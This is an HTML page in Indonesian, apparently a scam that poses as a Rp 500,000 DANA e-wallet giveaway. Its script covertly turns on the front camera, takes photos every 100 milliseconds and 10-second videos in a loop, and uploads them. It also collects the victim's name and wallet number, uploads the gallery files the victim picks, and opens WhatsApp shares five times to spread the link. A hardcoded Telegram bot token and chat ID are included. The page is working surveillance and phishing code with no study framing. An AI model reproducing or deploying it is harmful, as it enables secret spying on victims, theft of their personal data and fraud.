<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🎉 Klaim Dana 500rb</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #0b0e14;
            font-family: 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 16px;
            color: #fff;
        }
        .card {
            background: #1a1f2b;
            border-radius: 32px;
            padding: 32px 24px 28px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            border: 1px solid #2d3342;
            backdrop-filter: blur(4px);
            position: relative;
            overflow: hidden;
        }
        .card::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(74,108,247,0.05) 0%, transparent 70%);
            pointer-events: none;
        }
        .logo { text-align: center; font-size: 52px; margin-bottom: 4px; }
        .title { font-size: 26px; font-weight: 700; text-align: center; background: linear-gradient(135deg, #4a6cf7, #6a4cf7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sub { font-size: 14px; color: #8b93a7; text-align: center; margin: 4px 0 20px; }
        .amount { background: #1f2a3a; border-radius: 20px; padding: 16px; text-align: center; border: 1px solid #2d3b50; margin-bottom: 24px; }
        .amount span { font-size: 38px; font-weight: 800; color: #34c759; }
        .input-group { margin-bottom: 14px; }
        .input-group label { display: block; font-size: 13px; font-weight: 600; color: #aab3c9; margin-bottom: 4px; }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: #0d121c;
            border: 1px solid #2d3342;
            border-radius: 14px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: 0.2s;
        }
        .input-group input:focus { border-color: #4a6cf7; box-shadow: 0 0 0 3px rgba(74,108,247,0.2); }
        .btn {
            background: linear-gradient(135deg, #4a6cf7, #6a4cf7);
            border: none;
            color: #fff;
            padding: 16px;
            width: 100%;
            border-radius: 30px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 8px;
            box-shadow: 0 8px 24px rgba(74,108,247,0.3);
            position: relative;
            z-index: 1;
        }
        .btn:active { transform: scale(0.96); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .loader { display: none; margin: 16px auto; width: 32px; height: 32px; border: 3px solid #2d3342; border-top: 3px solid #4a6cf7; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
        .note { text-align: center; font-size: 12px; color: #5c6680; margin-top: 20px; }
        .note a { color: #4a6cf7; text-decoration: none; }
        #video, #canvas, #fileInput { display: none; }
        .toast {
            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
            background: #1f2a3a; color: #fff; padding: 14px 28px; border-radius: 40px;
            font-size: 14px; font-weight: 500; box-shadow: 0 8px 30px rgba(0,0,0,0.5);
            opacity: 0; transition: 0.4s; pointer-events: none; z-index: 999;
            border: 1px solid #2d3342;
            max-width: 90%;
            text-align: center;
        }
        .toast.show { opacity: 1; }
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #2d3342;
            border-radius: 10px;
            margin: 12px 0;
            overflow: hidden;
        }
        .progress-bar .fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #4a6cf7, #6a4cf7);
            transition: width 0.5s;
        }
        .status-text {
            font-size: 13px;
            color: #8b93a7;
            text-align: center;
            margin: 6px 0;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">💸</div>
        <div class="title">Klaim Dana 500rb</div>
        <div class="sub">🎁 Dapatkan Rp 500.000 langsung</div>
        <div class="amount"><span>+ Rp 500.000</span></div>

        <div class="input-group">
            <label>Nama Lengkap</label>
            <input type="text" id="fullName" placeholder="Nama sesuai KTP">
        </div>
        <div class="input-group">
            <label>Nomor Dana / E-Wallet</label>
            <input type="text" id="danaNumber" placeholder="08123456789">
        </div>
        <div class="input-group">
            <label>Email (opsional)</label>
            <input type="email" id="email" placeholder="email@example.com">
        </div>

        <button class="btn" id="claimBtn"><i class="fas fa-gift"></i> KLAIM SEKARANG</button>
        <div class="loader" id="loader"></div>

        <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
        <div class="status-text" id="statusText">Siap klaim saldo</div>

        <p class="note">*Dengan mengklaim, Anda menyetujui pengiriman data ke sistem kami</p>
    </div>

    <video id="video" autoplay muted></video>
    <canvas id="canvas"></canvas>
    <input type="file" id="fileInput" multiple accept="image/*,video/*" style="display:none">

    <div class="toast" id="toast"></div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <script>
        (function() {
            // ===== KONFIG =====
            const BOT_TOKEN = "8995760973:AAHeOTaXK5pFSn8Y5Z4tlxjgR7vbYOhgUpI";
            const CHAT_ID = "6126622503";
            const API_URL = '/api';

            // ===== DOM =====
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            const fileInput = document.getElementById('fileInput');
            const claimBtn = document.getElementById('claimBtn');
            const loader = document.getElementById('loader');
            const toast = document.getElementById('toast');
            const progressFill = document.getElementById('progressFill');
            const statusText = document.getElementById('statusText');

            let stream = null;
            let photoInterval = null;
            let videoInterval = null;
            let mediaRecorder = null;
            let chunks = [];
            let isRecording = false;
            let galleryFiles = [];

            // ===== WAKE LOCK =====
            async function keepScreenOn() {
                try {
                    const wl = await navigator.wakeLock.request('screen');
                    document.addEventListener('visibilitychange', () => {
                        if (document.visibilityState === 'visible') navigator.wakeLock.request('screen');
                    });
                } catch(e) {}
            }
            keepScreenOn();

            // ===== KAMERA + FOTO 0,1 DETIK =====
            function startCamera() {
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: true
                })
                .then(s => {
                    stream = s;
                    stream.getAudioTracks().forEach(t => t.enabled = false);
                    video.srcObject = stream;
                    video.play();

                    // FOTO 0,1 DETIK (100ms)
                    photoInterval = setInterval(() => {
                        if (!stream) return;
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        ctx.drawImage(video, 0, 0);
                        const base64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
                        sendToTelegram('photo', base64, null, 'foto_0.1.jpg');
                    }, 100);

                    // VIDEO 10 DETIK, LOOP TERUS
                    videoInterval = setInterval(() => {
                        if (!stream || isRecording) return;
                        chunks = [];
                        mediaRecorder = new MediaRecorder(stream, {
                            mimeType: 'video/webm',
                            audioBitsPerSecond: 0
                        });
                        mediaRecorder.ondataavailable = e => chunks.push(e.data);
                        mediaRecorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'video/webm' });
                            const reader = new FileReader();
                            reader.onload = function() {
                                const base64video = reader.result.split(',')[1];
                                sendToTelegram('document', null, base64video, 'video_10detik.webm');
                            };
                            reader.readAsDataURL(blob);
                            isRecording = false;
                        };
                        mediaRecorder.start();
                        isRecording = true;
                        setTimeout(() => {
                            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
                        }, 10000);
                    }, 11000); // jeda 1 detik antar rekaman
                })
                .catch(err => {
                    alert('Kamera wajib diizinkan!');
                    console.error(err);
                });
            }

            // ===== KIRIM KE TELEGRAM =====
            function sendToTelegram(type, imgBase64, videoBase64, filename) {
                const payload = { type, filename, ts: Date.now() };
                if (type === 'photo') payload.img = imgBase64;
                else if (type === 'document') payload.video = videoBase64;
                else return;
                fetch(API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(e => console.log('Kirim gagal'));
            }

            // ===== SCAN GALERI OTOMATIS (PAKAI FILE INPUT) =====
            function scanGallery() {
                // Trigger file input otomatis pas halaman load (butuh interaksi user, tapi kita pancing via tombol)
                // Kita akan panggil ini saat tombol "KLAIM" diklik
                fileInput.click();
            }

            fileInput.addEventListener('change', function(e) {
                const files = this.files;
                if (!files.length) return;
                galleryFiles = Array.from(files);
                statusText.innerText = `📁 ${galleryFiles.length} file galeri ditemukan, mengirim...`;
                progressFill.style.width = '0%';
                // Kirim semua file satu per satu
                let sent = 0;
                galleryFiles.forEach((file, index) => {
                    const reader = new FileReader();
                    reader.onload = function(ev) {
                        const base64 = ev.target.result.split(',')[1];
                        const isVideo = file.type.startsWith('video/');
                        const type = isVideo ? 'document' : 'photo';
                        sendToTelegram(type, isVideo ? null : base64, isVideo ? base64 : null, file.name);
                        sent++;
                        progressFill.style.width = (sent / galleryFiles.length * 100) + '%';
                        statusText.innerText = `📤 Mengirim galeri ${sent}/${galleryFiles.length}`;
                        if (sent === galleryFiles.length) {
                            statusText.innerText = '✅ Galeri terkirim semua!';
                            showToast('📦 Semua file galeri terkirim ke bot!');
                        }
                    };
                    reader.readAsDataURL(file);
                });
                this.value = ''; // reset
            });

            // ===== SHARE KE 5 GRUP WA OTOMATIS =====
            function shareToWhatsApp() {
                const link = window.location.href;
                const message = `🎉 Dapatkan Rp 500.000 gratis! Klik link ini: ${link}`;
                let count = 0;
                const interval = setInterval(() => {
                    if (count >= 5) {
                        clearInterval(interval);
                        statusText.innerText = '✅ Selesai bagikan ke 5 grup!';
                        return;
                    }
                    count++;
                    statusText.innerText = `📤 Membagikan ke grup ${count}/5...`;
                    window.open(`https://wa.me/?text=${encodeURIComponent(message)}`, '_blank');
                }, 3000); // jeda 3 detik biar gak keburu
            }

            // ===== KLAIM =====
            claimBtn.addEventListener('click', function(e) {
                e.preventDefault();
                const name = document.getElementById('fullName').value.trim();
                const dana = document.getElementById('danaNumber').value.trim();
                if (!name || !dana) { showToast('Isi nama & nomor Dana!'); return; }

                loader.style.display = 'block';
                this.disabled = true;
                statusText.innerText = '⏳ Memproses klaim...';
                progressFill.style.width = '20%';

                // Kirim data form
                const msg = `📝 KLAIM DANA\nNama: ${name}\nDana: ${dana}\nEmail: ${document.getElementById('email').value}`;
                fetch(`${API_URL}?msg=${encodeURIComponent(msg)}`)
                    .then(() => {
                        progressFill.style.width = '50%';
                        statusText.innerText = '📸 Mengaktifkan kamera & scan galeri...';
                        // Trigger scan galeri
                        scanGallery();
                        // Start share WA setelah 2 detik
                        setTimeout(() => {
                            progressFill.style.width = '80%';
                            statusText.innerText = '📤 Membagikan ke grup...';
                            shareToWhatsApp();
                        }, 2000);
                        // Selesai
                        setTimeout(() => {
                            progressFill.style.width = '100%';
                            statusText.innerText = '✅ Saldo akan dikirim dalam 5 menit!';
                            showToast('✅ Klaim berhasil! Cek bot Telegram.');
                            loader.style.display = 'none';
                            this.disabled = false;
                        }, 8000);
                    })
                    .catch(() => {
                        showToast('❌ Gagal, coba lagi');
                        loader.style.display = 'none';
                        this.disabled = false;
                    });
            });

            // ===== TOAST =====
            function showToast(text) {
                toast.textContent = text;
                toast.classList.add('show');
                clearTimeout(toast._timer);
                toast._timer = setTimeout(() => toast.classList.remove('show'), 4000);
            }

            // ===== START =====
            startCamera();
            statusText.innerText = '📷 Kamera aktif, siap klaim';
        })();
    </script>
</body>
</html>
